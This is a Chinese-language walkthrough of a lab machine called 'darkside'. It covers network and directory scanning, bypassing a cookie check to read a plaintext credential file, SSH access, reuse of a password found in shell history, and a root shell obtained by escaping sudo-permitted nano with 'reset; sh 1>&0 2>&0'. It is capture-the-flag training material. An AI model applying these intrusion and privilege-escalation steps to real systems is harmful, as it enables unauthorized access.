# 信息搜集

主机发现

```
┌──(kali㉿kali)-[~]
└─$ nmap -sn 192.168.2.0/24
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-15 03:46 EDT
Nmap scan report for darkside (192.168.2.19)
Host is up (0.00023s latency).
MAC Address: 08:00:27:3B:49:15 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for kali (192.168.2.12)
Host is up.
Nmap done: 256 IP addresses (9 hosts up) scanned in 2.75 seconds
```

端口扫描

```
┌──(kali㉿kali)-[~]
└─$ nmap -A -p- 192.168.2.19
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-15 03:47 EDT
Nmap scan report for darkside (192.168.2.19)
Host is up (0.00050s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u2 (protocol 2.0)
| ssh-hostkey: 
|   3072 e0:25:46:8e:b8:bb:ba:69:69:1b:a7:4d:28:34:04:dd (RSA)
|   256 60:12:04:69:5e:c4:a1:42:2d:2b:51:8a:57:fe:a8:8a (ECDSA)
|_  256 84:bb:60:b7:79:5d:09:9c:dd:24:23:a3:f2:65:89:3f (ED25519)
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: The DarkSide
MAC Address: 08:00:27:3B:49:15 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.50 ms darkside (192.168.2.19)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.12 seconds
```

# 漏洞利用

看一下80端口有什么

```
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.2.19      
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="styles.css">
    <title>The DarkSide</title>
</head>
<body>
    <div class="welcome-message">
        <h1>Welcome to the DarkSide</h1>
    </div>
    <div class="main">
        <form action="" method="POST">
            <h1>LOGIN</h1>

            
            <label>USERNAME</label>
            <input type="text" name="user">

            <label>PASSWORD</label>
            <input type="password" name="pass">

            <button type="submit">LOGIN</button>
        </form>
    </div>

</body>
</html>
```

一个登录页面，尝试目录扫描

```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://192.168.2.19 -w SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -x html,php,txt,jpg,png,zip,git
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.2.19
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,jpg,png,zip,git,html,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 277]
/.php                 (Status: 403) [Size: 277]
/index.php            (Status: 200) [Size: 683]
/backup               (Status: 301) [Size: 313] [--> http://192.168.2.19/backup/]                                                         
/.php                 (Status: 403) [Size: 277]
/.html                (Status: 403) [Size: 277]
/server-status        (Status: 403) [Size: 277]
/logitech-quickcam_w0qqcatrefzc5qqfbdz1qqfclz3qqfposz95112qqfromzr14qqfrppz50qqfsclz1qqfsooz1qqfsopz1qqfssz0qqfstypez1qqftrtz1qqftrvz1qqftsz2qqnojsprzyqqpfidz0qqsaatcz1qqsacatzq2d1qqsacqyopzgeqqsacurz0qqsadisz200qqsaslopz1qqsofocuszbsqqsorefinesearchz1.html (Status: 403) [Size: 277]
Progress: 9482032 / 9482040 (100.00%)
===============================================================
Finished
===============================================================
```

有个/backup/目录，目录下vote.txt文件

```
rijaba: Yes
xerosec: Yes
sml: No
cromiphi: No
gatogamer: No
chema: Yes
talleyrand: No
d3b0o: Yes

Since the result was a draw, we will let you enter the darkside, or at least temporarily, good luck kevin.
```

我们拿到了用户名，尝试爆破，登陆以后得到了一串字符串，解码出了：sfqekmgncutjhbypvxda.onion，查看一下

```
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.2.19/sfqekmgncutjhbypvxda.onion/
<!DOCTYPE html>
<html>
<head>
    <title>Which Side Are You On?</title>
    <style>
        body {
            background-color: black;
            color: white;
            font-size: 24px;
            margin: 0;
        }
    </style>
</head>
<body>
    <div>
        <p>Which Side Are You On?</p>
    </div>

    <script>
        var sideCookie = document.cookie.match(/(^| )side=([^;]+)/);
        if (sideCookie && sideCookie[2] === 'darkside') {
            window.location.href = 'hwvhysntovtanj.password';
        }
    </script>

    
</body>
</html>
```

读取cookie side如果值 == darkside  跳转到：hwvhysntovtanj.password，那我们可以直接访问 hwvhysntovtanj.password

```
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.2.19/sfqekmgncutjhbypvxda.onion/hwvhysntovtanj.password
kevin:ILoveCalisthenics
```

ssh登录一下

```
┌──(kali㉿kali)-[~]
└─$ ssh kevin@192.168.2.19      
The authenticity of host '192.168.2.19 (192.168.2.19)' can't be established.
ED25519 key fingerprint is SHA256:pmPw9d2/o54jN+Dmo29Hq6rIzWOQ//VhyZvK4KN6rmk.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.2.19' (ED25519) to the list of known hosts.
kevin@192.168.2.19's password: 
Linux darkside 5.10.0-26-amd64 #1 SMP Debian 5.10.197-1 (2023-09-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Oct 15 15:18:15 2023 from 10.0.2.18
kevin@darkside:~$
```

# 权限提升

在.history发现了密码，尝试一下

```
kevin@darkside:~$ cat .history 
ls -al
hostname -I
echo "Congratulations on the OSCP Xerosec"
top
ps -faux
su rijaba
ILoveJabita
ls /home/rijaba
kevin@darkside:~$ su rijaba
Password: 
rijaba@darkside:/home/kevin$ id
uid=1001(rijaba) gid=1001(rijaba) groups=1001(rijaba)
```

进入nano按CTRL+R，CTRL+X，输入reset; sh 1>&0 2>&0就提权成功了

```
rijaba@darkside:~$ sudo -l
Matching Defaults entries for rijaba on darkside:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User rijaba may run the following commands on darkside:
    (root) NOPASSWD: /usr/bin/nano
# id
uid=0(root) gid=0(root) groups=0(root)
```
